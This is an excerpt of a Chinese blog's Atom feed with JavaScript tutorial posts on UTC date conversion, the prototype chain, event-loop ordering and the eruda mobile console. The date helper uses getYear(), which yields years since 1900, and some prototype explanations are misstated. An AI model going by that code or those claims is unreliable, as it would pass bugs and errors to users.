    <content type="html"><![CDATA[<p>有时候前端会收到后端返回的时间格式是UTC时间戳格式的，但是他们又不愿意修改，将工作丢给前端，累觉不爱。</p><p>我们可以引入一个moment.js插件来快速处理时间格式，但是有时候我们不太方便去引入一个脚本，我们可以使用js来解析它：</p><p>转换成年月日<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UTC时间戳转换成年月日(2017-08-01)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">resolveUTCDate</span> (<span class="params">utcData</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> myDate = <span class="keyword">new</span> <span class="built_in">Date</span>(utcData);</span><br><span class="line">  <span class="keyword">var</span> year = myDate.getYear();</span><br><span class="line">  <span class="keyword">var</span> month = (<span class="string">'0'</span> + (myDate.getMonth() + <span class="number">1</span>)).slice(<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">var</span> day = (<span class="string">'0'</span> + myDate.getDate()).slice(<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">return</span> year + <span class="string">'-'</span> + month + <span class="string">'-'</span> + day;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>转换成时分秒<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// UTC时间戳转换成时分秒(08:08:08)</span><br><span class="line">function resolveUTCTime(utcTime) &#123;</span><br><span class="line">  var myDate = new Date(utcTime);</span><br><span class="line">  var hours = (&apos;0&apos; + myDate.getHours()).slice(-2);</span><br><span class="line">  var minutes = (&apos;0&apos; + myDate.getMinutes()).slice(-2);</span><br><span class="line">  var seconds = (&apos;0&apos; + myDate.getSeconds()).slice(-2);</span><br><span class="line">  return hours + &apos;:&apos; + minutes + &apos;:&apos; + seconds;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      js将UTC时间转化成普通时间：年月日时分秒
    
    </summary>
    
    
      <category term="JavaScript" scheme="http://pimichen.com/blog/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>js原型链</title>
    <link href="http://pimichen.com/blog/javascript/js%E5%8E%9F%E5%9E%8B%E9%93%BE.html"/>
    <id>http://pimichen.com/blog/javascript/js原型链.html</id>
    <published>2018-12-18T16:00:00.000Z</published>
    <updated>2018-12-18T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="创建对象的几种方式"><a href="#创建对象的几种方式" class="headerlink" title="创建对象的几种方式"></a>创建对象的几种方式</h3><p>  1、字面量法<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o1 = &#123;<span class="attr">name</span>: <span class="string">'o1'</span>&#125;;</span><br></pre></td></tr></table></figure></p><p>  2、构造函数法（构造函数首字母大写）<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o2 = <span class="keyword">new</span> <span class="built_in">Object</span>(&#123;<span class="attr">name</span>: <span class="string">'o2'</span>&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> M = <span class="function"><span class="keyword">function</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="comment">// return this // 默认有这一行</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> o3 = <span class="keyword">new</span> M(<span class="string">'o3'</span>); <span class="comment">// 实例</span></span><br></pre></td></tr></table></figure></p><p>  3、Object.create()法<br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o4 = <span class="built_in">Object</span>.create(&#123;<span class="attr">name</span>: <span class="string">'o4'</span>&#125;);</span><br></pre></td></tr></table></figure></p><p>  以上的运行结果如下：<br>  <img src="../images/javascript/js_object_result.png" width="60%" title="几种创建对象的运行结果"></p><p>  我们看到o3和o4的运行结果有些不一样，o3前面的M表示构造函数，o4却不显示属性</p><p>  但是运行<code>o4.name</code>发现其实是有值的，具体原因参考：<a href="https://www.cnblogs.com/leijee/p/7490822.html" target="_blank" rel="noopener">leijee blog</a><br>  <img src="../images/javascript/js_object_result2.png" width="60%" title=""></p><h3 id="构造函数扩展"><a href="#构造函数扩展" class="headerlink" title="构造函数扩展"></a>构造函数扩展</h3><ol><li><code>var arr = []</code> 其实是 <code>var a = new Array()</code> 的语法糖；</li><li><code>var obj = {}</code> 其实是 <code>var a = new Object()</code> 的语法糖；</li><li><code>function Foo(){}</code> 其实是 <code>var Foo = new Function(){}</code>；</li></ol><p>即 arr 的构造函数是 <code>Array</code>, obj 的构造函数是 <code>Object</code>，Foo 的构造函数是 <code>Function</code>。</p><h3 id="原型规则"><a href="#原型规则" class="headerlink" title="原型规则"></a>原型规则</h3><ul><li><p>规则1：所有的引用类型（数组、对象、函数），都具有对象特性，可自有扩展属性（null 除外）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">obj.a = <span class="number">100</span>; <span class="comment">// &#123;a: 100&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr = [];</span><br><span class="line">arr.a = <span class="number">100</span>; <span class="comment">// [a: 100]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">fn.a = <span class="number">100</span>;</span><br></pre></td></tr></table></figure></li><li><p>规则2：所有的引用类型（数组、对象、函数），都有一个 <code>__proto__</code> (隐式原型) 属性，属性值是一个普通的对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(obj.__proto__);</span><br><span class="line"><span class="built_in">console</span>.log(arr.__proto__);</span><br><span class="line"><span class="built_in">console</span>.log(fn.__proto__);</span><br></pre></td></tr></table></figure><p>结果如下图：<br><img src="../images/javascript/js__proto__.png" width="80%" title="__proto__属性"></p></li></ul><ul><li><p>规则3：所有的函数，都有一个 <code>prototype</code> (显示原型) 属性，属性值是一个普通的对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(fn.prototype); <span class="comment">// &#123;constructor: ƒ&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>规则4：所有的引用类型（数组、对象、函数），<code>__proto__</code> (隐式属性) 属性值指向它的构造函数的 <code>prototype</code> (显示原型) 属性值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(obj.__proto__ === <span class="built_in">Object</span>.prototype); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(arr.__proto__ === <span class="built_in">Array</span>.prototype); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(fn.__proto__ === <span class="built_in">Function</span>.prototype); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li><li><p>规则5：当试图得到一个对象的某个属性时，如果这个对象本身没有这个属性，那么会去它的 <code>__proto__</code>（即它的构造函数的 <code>prototype</code>）中去寻找，如果一层没有找到，就继续往上查找，一直到 <code>Object.prototype</code> 为止。因为 <code>Object.prototype</code> 等于 <code>null</code> 会自动停止。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 扩展属性（规则1）</span></span><br><span class="line">Foo.prototype.alertName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个实例f</span></span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> Foo(<span class="string">'zhangsan'</span>);</span><br><span class="line"><span class="comment">// 扩展属性（规则1）</span></span><br><span class="line">f.printName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line">f.printName();</span><br><span class="line">f.alertName(); <span class="comment">// (规则5)</span></span><br><span class="line"><span class="comment">// f本身没有 alertName 属性，它会去它自身的隐式原型 即f.__proto__ (也即是它的构造函数的显示原型 Foo.prototype)中去寻找这个属性</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f.toString(); <span class="comment">// (规则5)</span></span><br><span class="line"><span class="comment">// f本身没有 toString 属性，它会去它自身的隐式原型 即f.__proto__ (也即是它的构造函数的显示原型 Foo.prototype)中去寻找这个属性</span></span><br><span class="line"><span class="comment">// 但是 Foo.prototype 中并没有找到这个属性，但是因为 Foo.prototype 本身也是一个对象，所以会继续向上寻找，Foo.prototype 的构造函数是 Object</span></span><br><span class="line"><span class="comment">// 即去 f.__proto__.__proto__中查找，也即是 Object.prototype 中查找，最终发现了toString</span></span><br><span class="line"></span><br><span class="line">f.__proto__ === Foo.prototype; <span class="comment">// true</span></span><br><span class="line">f.__proto__.__proto__ === <span class="built_in">Object</span>.prototype; <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p><img src="../images/javascript/js_prototype2.png" width="100%" title="原型链图解"></p></li></ul><h3 id="循环对象自身的属性"><a href="#循环对象自身的属性" class="headerlink" title="循环对象自身的属性"></a>循环对象自身的属性</h3><p>对于上例，循环f自身的属性：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> item <span class="keyword">in</span> f) &#123;</span><br><span class="line">  <span class="keyword">if</span> (f.hasOwnProperty(item)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(item);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// name</span></span><br><span class="line"><span class="comment">// printName</span></span><br></pre></td></tr></table></figure></p><h3 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f <span class="keyword">instanceof</span> Foo; <span class="comment">// f是否是Foo的一个实例</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断逻辑是：</span></span><br><span class="line"><span class="comment">// f的 __proto__ 一层一层往上，能否对应到 Foo.prototype，结果为true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 同理：</span></span><br><span class="line">f <span class="keyword">instanceof</span> <span class="built_in">Object</span>; <span class="comment">// f是否是Object的一个实例，结果为true</span></span><br></pre></td></tr></table></figure><h3 id="构造函数、原型对象、实例、原型链关系网"><a href="#构造函数、原型对象、实例、原型链关系网" class="headerlink" title="构造函数、原型对象、实例、原型链关系网"></a>构造函数、原型对象、实例、原型链关系网</h3><p>  关系网如下：<br>  <img src="../images/javascript/js_prototype.png" width="100%" title="构造函数、原型对象、实例、原型链关系网"><br>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> M = <span class="function"><span class="keyword">function</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;; <span class="comment">// 构造函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o3 = <span class="keyword">new</span> M(<span class="string">'o3'</span>); <span class="comment">// 实例o3</span></span><br><span class="line"><span class="keyword">var</span> o4 = <span class="keyword">new</span> M(<span class="string">'o4'</span>); <span class="comment">// 实例o4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// M: 是一个构造函数，任何普通函数在使用new运算符之后都变成构造函数</span></span><br><span class="line"><span class="comment">// o3、o4: 实例</span></span><br><span class="line"><span class="comment">// M.prototype: 原型对象</span></span><br><span class="line"><span class="comment">// M.prototype.constructor: 原型对象的构造器，M.prototype.constructor === M</span></span><br><span class="line"><span class="comment">// o3.__proto__: 实例的__prto__属性，o3.__proto__ === M.prototype</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 实际上函数也有__proto__属性，M.__proto__ === Function.prototype，这个逻辑说明M构造函数是Function的一个实例</span></span><br></pre></td></tr></table></figure></p><p>  <img src="../images/javascript/js_prototype_result.png" width="60%" title="构造函数、原型对象、实例、原型链"></p><h3 id="面试题：写一个原型链继承的demo"><a href="#面试题：写一个原型链继承的demo" class="headerlink" title="面试题：写一个原型链继承的demo"></a>面试题：写一个原型链继承的demo</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 父类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = <span class="string">'test name'</span>;</span><br><span class="line">&#125;</span><br><span class="line">A.prototype.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类B</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">B</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.age = <span class="number">12</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// B继承A</span></span><br><span class="line">B.prototype = <span class="keyword">new</span> A();</span><br><span class="line">B.prototype.getAge = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类C</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">C</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.sex = <span class="string">'male'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// C继承B</span></span><br><span class="line">C.prototype = <span class="keyword">new</span> B();</span><br><span class="line">C.prototype.getSex = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.sex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建实例（abc是C的实例，C继承B，B继承A，所以abc可以调用A、B、C的方法）</span></span><br><span class="line"><span class="keyword">var</span> abc = <span class="keyword">new</span> C();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(abc.getSex()); <span class="comment">// male</span></span><br><span class="line"><span class="built_in">console</span>.log(abc.getAge()); <span class="comment">// 12</span></span><br><span class="line"><span class="built_in">console</span>.log(abc.getName()); <span class="comment">// test name</span></span><br></pre></td></tr></table></figure><p>打印 <code>console.dir(abc);</code></p><p><img src="../images/javascript/js_prototype3.png" width="80%" title="多次继承的实例输出图"><br>从图中我们可以看出，通过 <code>prototype</code> 扩展的属性会挂载在 <code>__proto__</code> 属性下，通过 <code>hasOwnProperty</code> 方法可过滤扩展的属性<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">abc.hasOwnProperty(<span class="string">'sex'</span>); <span class="comment">// true</span></span><br><span class="line">abc.hasOwnProperty(<span class="string">'getSex'</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure></p><p>我们可以打印一下隐式原型 <code>__proto__</code> 和显式原型 <code>prototype</code> 的关系图<br><img src="../images/javascript/js_prototype4.png" width="80%" title="隐式原型__proto__和显式原型的关系"></p><p>打印 <code>console.log(abc.prototype)</code>，输出为 <code>undefined</code>，我们可以知道，实例是没有 <code>prototype</code> 属性的</p><h3 id="面试题：写一个实际应用中使用原型链的例子"><a href="#面试题：写一个实际应用中使用原型链的例子" class="headerlink" title="面试题：写一个实际应用中使用原型链的例子"></a>面试题：写一个实际应用中使用原型链的例子</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实现类似jquery html()和on(event, fn)方法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Elem</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.elem = <span class="built_in">document</span>.getElementById(id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 扩展一个设置html内容的方法</span></span><br><span class="line">Elem.prototype.html = <span class="function"><span class="keyword">function</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> elem = <span class="keyword">this</span>.elem;</span><br><span class="line">  <span class="keyword">if</span>(val) &#123;</span><br><span class="line">    elem.innerHTML = val;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>; <span class="comment">// 链式操作</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> elem.innerHTML;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 扩张一个事件绑定的方法</span></span><br><span class="line">Elem.prototype.on = <span class="function"><span class="keyword">function</span>(<span class="params">type, fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> elem = <span class="keyword">this</span>.elem;</span><br><span class="line">  elem.addEventListener(type, fn);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>; <span class="comment">// 链式操作</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> div1 = <span class="keyword">new</span> Elem(<span class="string">'div1'</span>);</span><br><span class="line"><span class="comment">// console.log('div1');</span></span><br><span class="line">div1.html(<span class="string">'&lt;p&gt;hello word&lt;/p&gt;'</span>); <span class="comment">// 设置html内容</span></span><br><span class="line">div1.on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="comment">// 绑定一个点击事件</span></span><br><span class="line">  alert(<span class="string">'clicked'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 我们在扩展html方法的时候写了一个 return this返回这个实例，就可以实现类似jquery链式操作的功能</span></span><br><span class="line">div1.html(<span class="string">'&lt;p&gt;hello word&lt;/p&gt;'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="comment">// 绑定一个点击事件</span></span><br><span class="line">  alert(<span class="string">'clicked'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 因为我们在每个扩展的方法里面都写了一个return this，所以链式操作的顺序可以调换</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 甚至我们可以重复调用多次扩展的方法</span></span><br><span class="line">div1.html(<span class="string">'&lt;p&gt;hello word&lt;/p&gt;'</span>).html(<span class="string">'&lt;p&gt;Hello Word&lt;/p&gt;'</span>);</span><br></pre></td></tr></table></figure><h3 id="面试题：描述-new-一个对象的过程"><a href="#面试题：描述-new-一个对象的过程" class="headerlink" title="面试题：描述 new 一个对象的过程"></a>面试题：描述 new 一个对象的过程</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">  <span class="comment">// return this;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> Foo(<span class="string">'zhangsan'</span>, <span class="number">18</span>);</span><br></pre></td></tr></table></figure><ol><li>创建一个对象</li><li><code>this</code> 指向这个新对象</li><li>执行代码，即对 <code>this</code> 赋值</li><li>返回 <code>this</code>，内部会有一句默认的 <code>return this</code></li></ol><blockquote><p>本文参考：<a href="https://coding.imooc.com/class/129.html" target="_blank" rel="noopener">慕课网 原型链</a><br>更多参考：<a href="https://www.cnblogs.com/libin-1/p/5820550.html" target="_blank" rel="noopener">JS原型链简单图解</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      js原型链、构造函数、原型对象、实例
    
    </summary>
    
    
      <category term="JavaScript" scheme="http://pimichen.com/blog/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>js执行机制</title>
    <link href="http://pimichen.com/blog/javascript/js%E6%89%A7%E8%A1%8C%E6%9C%BA%E5%88%B6.html"/>
    <id>http://pimichen.com/blog/javascript/js执行机制.html</id>
    <published>2018-11-09T16:00:00.000Z</published>
    <updated>2018-11-09T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>抛出问题，输出下列程序：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(function()&#123;</span><br><span class="line">    console.log(&apos;定时器开始啦&apos;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">new Promise(function(resolve)&#123;</span><br><span class="line">    console.log(&apos;马上执行for循环啦&apos;);</span><br><span class="line">    for(var i = 0; i &lt; 10000; i++)&#123;</span><br><span class="line">        i == 99 &amp;&amp; resolve();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).then(function()&#123;</span><br><span class="line">    console.log(&apos;执行then函数啦&apos;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">console.log(&apos;代码执行结束&apos;);</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">马上执行for循环啦</span><br><span class="line">代码执行结束</span><br><span class="line">执行then函数啦</span><br><span class="line">定时器开始啦</span><br></pre></td></tr></table></figure><blockquote><p>内部执行机制查看<a href="https://juejin.im/post/59e85eebf265da430d571f89" target="_blank" rel="noopener">掘金 ssssyoki</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      这一次，彻底弄懂 JavaScript 执行机制
    
    </summary>
    
    
      <category term="JavaScript" scheme="http://pimichen.com/blog/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>移动端开发devtools</title>
    <link href="http://pimichen.com/blog/javascript/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%BC%80%E5%8F%91devtools.html"/>
    <id>http://pimichen.com/blog/javascript/移动端开发devtools.html</id>
    <published>2018-11-02T16:00:00.000Z</published>
    <updated>2018-11-02T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>来源：<a href="https://github.com/liriliri/eruda" target="_blank" rel="noopener">eruda</a></p></blockquote><p>CDN:<a href="https://cdn.bootcss.com/eruda/1.2.6/eruda.min.js" target="_blank" rel="noopener">https://cdn.bootcss.com/eruda/1.2.6/eruda.min.js</a></p><p>用法：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"https://cdn.bootcss.com/eruda/1.2.6/eruda.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="built_in">window</span>.eruda.init();</span><br><span class="line">  <span class="comment">// 自定义显示面板，默认全显示</span></span><br><span class="line">  <span class="comment">// window.eruda.init(&#123;</span></span><br><span class="line">  <span class="comment">//   tool: ['console', 'element']</span></span><br><span class="line">  <span class="comment">// &#125;);</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">  /</span><span class="regexp">/ test</span></span><br><span class="line"><span class="regexp">  console.log('11111');</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">  var obj = &#123;</span></span><br><span class="line"><span class="regexp">    a: '1',</span></span><br><span class="line"><span class="regexp">    b: '2', </span></span><br><span class="line"><span class="regexp">    c: '3'</span></span><br><span class="line"><span class="regexp">  &#125;;</span></span><br><span class="line"><span class="regexp">  console.log(obj);</span></span><br><span class="line"><span class="regexp">  console.dir(obj);</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">  window.localStorage.setItem('a', '123');</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure></p><p>DEMO:<br><img src="../images/javascript/mobile-console-demo.png" 